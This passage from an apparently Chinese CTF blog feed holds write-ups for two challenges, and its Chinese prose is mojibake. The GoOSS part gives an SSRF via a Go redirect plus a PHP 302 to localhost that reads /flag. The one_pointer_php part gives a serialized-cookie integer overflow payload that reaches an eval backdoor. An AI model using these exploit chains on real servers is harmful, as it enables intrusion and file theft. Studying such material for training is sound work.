æ–‡ä»¶çš„åŠŸèƒ½ï¼Œå½“æ—¶å°è¯•äº†ä¸‹ï¼Œä¼¼ä¹å¹¶ä¸å­˜åœ¨ä»€ä¹ˆæ¼æ´â€¦â€¦</p><p>fileMidderware:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fileMidderware</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">fileSystem := http.Dir(<span class="string">&quot;./files/&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.String() == <span class="string">&quot;/&quot;</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">f, err := fileSystem.Open(c.Request.URL.String())</span><br><span class="line"><span class="keyword">if</span> f == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line">fi, err := f.Stat()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> fi.IsDir() &#123;</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line">c.Redirect(<span class="number">302</span>, c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">files := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">l, _ := f.Readdir(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> l &#123;</span><br><span class="line">files = <span class="built_in">append</span>(files, i.Name())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line"><span class="string">&quot;files&quot;</span>: files,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">data, _ := ioutil.ReadAll(f)</span><br><span class="line">c.Header(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">`attachment; filename=`</span>+fi.Name())</span><br><span class="line">c.Data(<span class="number">200</span>, <span class="string">&quot;text/plain&quot;</span>, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨/vulä¸­è¯·æ±‚<code>&#123;&quot;url&quot;:&quot;127.0.0.1:1234/../&quot;&#125;</code>:</p><p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512201947610.png" alt="image-20210512201947610"></p><p>è®¿é—®åˆ°äº†ä¸Šçº§filesç›®å½•ï¼Œä¸å­˜åœ¨åˆ«çš„ä¸œè¥¿äº†â€¦â€¦</p><p>æºç ç»™äº†index.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// php in localhost port 80</span></span><br><span class="line"></span><br><span class="line">readfile($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœèƒ½è®¿é—®åˆ°80é»˜è®¤ç«¯å£ä¸Šçš„indexå¹¶ä¼ å‚å°±å¯ä»¥è·å–flag</p><h4><span id="ssrf">ssrf</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line">c.Redirect(<span class="number">302</span>, c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure><p>å…³é”®æ˜¯è¿™é‡Œçš„ä»£ç â€¦â€¦ç”±äºginçš„é…ç½®ï¼Œè®¿é—®<code>xxx.xxx.xxx/haha</code>ä¸<code>xxx.xxx.xxx/haha/</code>å¹¶ä¸ç›¸åŒ</p><p><code>strings.HasSuffix</code>æ£€æµ‹<code>c.Request.URL</code>æ˜¯å¦ä»¥\ç»“å°¾ï¼Œè‹¥ä¸æ˜¯åˆ™åŠ ä¸Šå¹¶è·³è½¬ã€‚å¤§æ¦‚æœ¬æ„ä¹Ÿè®¸æ˜¯æƒ³è§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿ(å¥½åƒå“ªé‡Œåˆä¸å¤§å¯¹)â€¦â€¦</p><p>é…ç½®å¥½dlvè°ƒè¯•ä»£ç æœåŠ¡ï¼š</p><img src="/images/æ´¥é—¨æ¯GoOSS/image-20210512203038285.png" alt="image-20210512203038285" style="zoom:80%;"><p>cä¸­å«æœ‰requestï¼š</p><img src="/images/æ´¥é—¨æ¯GoOSS/image-20210512203334500.png" alt="image-20210512203334500" style="zoom:80%;"><p>requestä¸­å«æœ‰hostå’Œurlï¼Œè¿™é‡Œçš„urlåº”è¯¥ç±»ä¼¼ä¸ºèµ„æºæ–‡ä»¶ï¼Ÿ</p><img src="/images/æ´¥é—¨æ¯GoOSS/image-20210512204621788.png" alt="image-20210512204621788" style="zoom:80%;"><p>å¦‚æœæˆ‘ä»¬ä¼ å…¥ï¼š<code>&#123;&quot;url&quot;:&quot;http://127.0.0.1:1234//1/..&quot;&#125;</code>ï¼š</p><p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512203705614.png" alt="image-20210512203705614"></p><p>ç½‘ç«™å°è¯•è§£æç½‘å€<strong>1</strong>â€¦â€¦</p><p>åœ¨ä¸ä»¥<code>/</code>ç»“å°¾çš„æƒ…å†µä¸‹ï¼Œ302è·³è½¬ç›´æ¥ä½¿ç”¨<strong>c.Request.URL</strong>è¿›è¡Œè·³è½¬ï¼Œç±»ä¼¼åŠ è½½å¤–éƒ¨jsï¼Œæ‹¼æ¥ä¸Š<code>/</code>åï¼Œ<code>//1/../</code>è¢«è®¤ä¸ºæ˜¯ç›¸å¯¹urlå¹¶äºˆä»¥è®¿é—®ï¼ˆå¤§æ¦‚ï¼‰ï¼Œé€ æˆssrfï¼ˆåº”è¯¥ï¼‰ã€‚</p><blockquote><p><a href="https://guokeya.github.io/post/5IcFhBKyk/">https://guokeya.github.io/post/5IcFhBKyk/</a></p><p>å¤§å¸ˆå‚…è¯´ï¼š</p><p>Locationå¯ä»¥æ§åˆ¶ä¸º//ï¼Œè€Œ//å°±æ˜¯çœç•¥HTTPåè®®çš„å†™æ³•ï¼Œä»¥ä½œå‚è€ƒã€‚</p></blockquote><h4><span id="302è·³è½¬">302è·³è½¬</span></h4><p>æˆ‘ä»¬ç°åœ¨èƒ½æ§åˆ¶ç›®æ ‡æœºè®¿é—®å¤–ç½‘ï¼Œé‚£æ€ä¹ˆåˆ©ç”¨è¿™ä¸€ç‚¹å‘¢â€¦â€¦</p><p>æˆ‘ä»¬å¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨å†™ä¸€ä¸ª302è·³è½¬ï¼Œä½¿ç›®æ ‡æœºè®¿é—®åè·³è½¬åˆ°(ç›®æ ‡æœº)æœ¬æœºçš„é»˜è®¤ç«¯å£ä¸Šå¹¶è¯»å–flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Location: http://127.0.0.1/index.php?file=/flag&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512205534307.png" alt="image-20210512205534307"></p><p>è·å¾—flagï¼</p><p>æµç¨‹ï¼š</p><p>è®¿é—®/vul-ã€‹fileMidderware-ã€‹vulController-ã€‹<code>resp, err := client.Get(url.Url)</code>-ã€‹fileMidderware-ã€‹<strong>302è·³è½¬</strong>(c.Request.URL)-ã€‹æœåŠ¡å™¨-ã€‹<strong>302è·³è½¬</strong>-ã€‹127.0.0.1/index.php?file=xxx-ã€‹flag</p><blockquote><p>æ€»ä¹‹è¿˜æ˜¯æäº†ä¸å°‘ä¸œè¥¿çš„ï¼Œè™½ç„¶æœ‰å¾ˆå¤šæ— ç”¨åŠŸï¼ŒèŠ±äº†å¥½å‡ å¤©ï¼Œä½†ä¹Ÿå¾ˆå¢é•¿çŸ¥è¯†ã€‚</p><p>å¦‚æœå“ªé‡Œæˆ‘ç†è§£çš„ä¸å¯¹å¸Œæœ›èƒ½å‘Šè¯‰æˆ‘ï¼</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;æ´¥é—¨æ¯gooss&quot;&gt;æ´¥é—¨æ¯GoOSS&lt;/span&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;å¼„æ‡‚è¿™é“é¢˜èŠ±äº†æˆ‘å¾ˆé•¿æ—¶é—´ï¼ŒæœŸé—´èµ°äº†å¾ˆå¤šå¼¯è·¯â€¦â€¦ï¼ˆ&lt;strong&gt;wotaicaile&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨å†™è¿™é“é¢˜çš„è·¯ä¸Šï¼Œæˆ‘å­¦ä¹ (äº†è§£)äº†DNSç»‘</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>è“å¸½æ¯2021å¤ç°</title>
    <link href="http://example.com/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-05-08T09:28:24.000Z</published>
    <updated>2021-08-23T08:05:36.032Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="è“å¸½æ¯2021å¤ç°">è“å¸½æ¯2021å¤ç°</span></h3><h4><span id="one_pointer_php">one_Pointer_php</span></h4><p>buuä¸Šå¼€äº†ç¯å¢ƒï¼ŒçœŸä¸é”™</p><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>add_api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$user=<span class="keyword">new</span> User;</span><br><span class="line">$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°±ä¸¤ä¸ªæ–‡ä»¶â€¦â€¦</p><p>å½“æ—¶çœ‹äº†åŠå¤©ï¼Œå°±åªçŸ¥é“è¦ç»•è¿‡<code>if($count[]=1)</code>â€¦â€¦å¯è¿™ç©æ„ä¸æ˜¯æ’å¯¹çš„å—â€¦â€¦</p><p>è¿™å…³ç³»åˆ°phpçš„ç´¢å¼•æ•°ç»„æº¢å‡º</p><h5><span id="phpæ•°ç»„">PHPæ•°ç»„</span></h5><p><a href="https://blog.csdn.net/weixin_43821278/article/details/114763459">https://blog.csdn.net/weixin_43821278/article/details/114763459</a></p><p>æ ¹æ®è¿™ç¯‡æ–‡ç« çš„å®éªŒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php 5.59nts</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a[<span class="number">2147483647</span>]=<span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">$a[]=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><p><img src="D:\HexoBlog\source\images\è“å¸½æ¯2021å¤ç°\image-20210508181911478.png" alt="image-20210508181911478"></p><blockquote><p>$a[]è®¿é—®åˆ°çš„æ˜¯å½“å‰æœ€å¤§æ•°å€¼ç´¢å¼•çš„ä¸‹ä¸€ä½</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨5.5.9ntsç‰ˆæœ¬ä¸‹ï¼Œ2147483647å°±æ˜¯æ•°å€¼ç´¢å¼•çš„ç•Œé™ï¼Œè€Œ2147483647æ­£æ˜¯5.5.9ç‰ˆæœ¬ä¸­é»˜è®¤è®¾ç½®çš„æ•´å‹æœ€å¤§å€¼ï¼š<code>PHP_INT_MAX:int(2147483647)</code>ã€‚</p><p>è¿™é‡Œçš„intï¼Œæ˜¯<strong>æœ‰ç¬¦å·32ä½äºŒè¿›åˆ¶å¯è¡¨ç¤ºçš„æœ€å¤§æ•°</strong>ã€‚</p><blockquote><p><strong>2^31-1</strong>=<strong>2147483647</strong></p></blockquote><p>å¦‚æœè¶…è¿‡äº†å‘¢ï¼Ÿ</p><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165829865.png" alt="image-20210513165829865"></p><p>è¿™é‡Œä¼šè½¬åŒ–ä¸ºèŒƒå›´æ›´å¤§çš„floatå‚¨å­˜â€¦â€¦</p><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165839374.png" alt="image-20210513165839374"></p><p>æ•°ç»„ä¸­æº¢å‡ºåå°±ä¼šå›æ»šä»intçš„æœ€å°å€¼ï¼Œäºæ˜¯ä¼šç¬¦åˆè¿™æ ·çš„è§„å¾‹ï¼š</p><blockquote><p>0â€”2147483647                       ä¸‹æ ‡0~2147483647 </p><p>2147483648â€”4294967296   ä¸‹æ ‡-2147483648~0 </p><p>4294967296â€”6442450943   ä¸‹æ ‡ 0~2147483647</p><p>ä¸‹ä¸€ä¸ªæº¢å‡ºä¸º0çš„æ•°å­—æ˜¯ï¼š8589934592</p></blockquote><p>è¿™æ ·ä½¿ç”¨ä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœæ˜¯é€šè¿‡<code>$a[]</code>å»è·å–å°±ä¼šäº§ç”ŸæŠ¥é”™ï¼Œç›¸å…³ç‰ˆæœ¬çš„é¢˜ç›®æ˜¯<code>XCTF-favorite_number</code>ï¼Œå¯ä»¥ç ”ç©¶ç ”ç©¶ã€‚</p><h5><span id="è¾ƒæ–°çš„ç‰ˆæœ¬">è¾ƒæ–°çš„ç‰ˆæœ¬</span></h5><p>è¿™é‡Œæ˜¯7.3.4ntsçš„phpç‰ˆæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MAXï¼š&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MAX);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MINï¼š&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MIN);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_SIZEï¼š&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_SIZE);</span><br><span class="line"></span><br><span class="line">$a =<span class="number">9223372036854775806</span>;</span><br><span class="line">$b =<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_intï¼š&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_floatï¼š&quot;</span>;</span><br><span class="line">var_dump(is_float($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºï¼š</span><br><span class="line">PHP_INT_MAXï¼šint(9223372036854775807)</span><br><span class="line">PHP_INT_MINï¼šint(-9223372036854775808)</span><br><span class="line">PHP_INT_SIZEï¼šint(8)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">is_intï¼šbool(false)</span><br><span class="line">is_floatï¼šbool(true)</span><br><span class="line">9223372036854775806</span><br><span class="line">9223372036854775807</span><br><span class="line">9.2233720368548E+18</span><br></pre></td></tr></table></figure><p>åŒæ ·ä¼šè½¬åŒ–ä¸ºfloatè€Œä¸å†å±äºæ•´å‹ï¼Œå¹¶ä¼šä»¥ç§‘å­¦è®¡æ•°æ³•è¾“å‡º</p><p>è¿™é‡Œçš„â€œintâ€ï¼Œæ˜¯<strong>æœ‰ç¬¦å·64ä½äºŒè¿›åˆ¶å¯è¡¨ç¤ºçš„æœ€å¤§æ•°</strong>ï¼Œæˆ–è€…è¯´ï¼Œæˆ‘ä»¬æ›´åŠ ç†Ÿæ‚‰çš„<strong>long long int</strong>ã€‚</p><blockquote><p><strong>2^63-1</strong>=<strong>9223372036854775807</strong></p></blockquote><p>è¾ƒæ–°çš„ç‰ˆæœ¬å¤§æ¦‚æ˜¯æé«˜äº†ç´¢å¼•æº¢å‡ºçš„é˜ˆå€¼â€¦â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a[<span class="number">9223372036854775806</span>]=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165907924.png" alt="image-20210513165907924"></p><p>æœ€åçš„è¯­å¥æˆåŠŸæŠ¥é”™ï¼Œæ ¹æ®è¿™ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$user=<span class="keyword">new</span> User;</span><br><span class="line">$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a =<span class="keyword">new</span> User();</span><br><span class="line">$a -&gt;count=<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line">$a =urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥æˆåŠŸç»•è¿‡èµ‹å€¼åˆ¤æ–­</p><blockquote><p>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</p></blockquote><p>æ‰§è¡Œå‘½ä»¤ï¼Œæ¥phpinfoçœ‹çœ‹æ•æ„Ÿä¿¡æ¯ï¼š</p><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165922744.png" alt="image-20210513165922744"></p><p>â€¦â€¦ä¸Šä¸€ä¸ªç»•è¿‡<strong>disable_function</strong>çš„è¿˜æ˜¯soåŠ«æŒæˆ–è€…èšå‰‘æ’ä»¶â€¦â€¦ä¸æ˜¯å¾ˆä¼šâ€¦â€¦</p><p>çœ‹äº†dalaoçš„wpï¼Œä¸€ç›´æä¸å¥½â€¦â€¦åŸç†å€’æ˜¯çœ‹äº†ä¸ƒä¸ƒå…«å…«â€¦â€¦</p><p>ç„¶åâ€¦â€¦æ²¡æœ‰ç„¶åäº†â€¦â€¦è¹²ä¸€ä¸ªå¥½å¤§ä½¬çš„wpğŸ˜¢</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;è“å¸½æ¯2021å¤ç°&quot;&gt;è“å¸½æ¯2021å¤ç°&lt;/span&gt;&lt;/h3&gt;&lt;h4&gt;&lt;span id=&quot;one_pointer_php&quot;&gt;one_Pointer_php&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;buuä¸Šå¼€äº†ç¯å¢ƒï¼ŒçœŸä¸é”™&lt;/p&gt;
&lt;p&gt;user.php&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
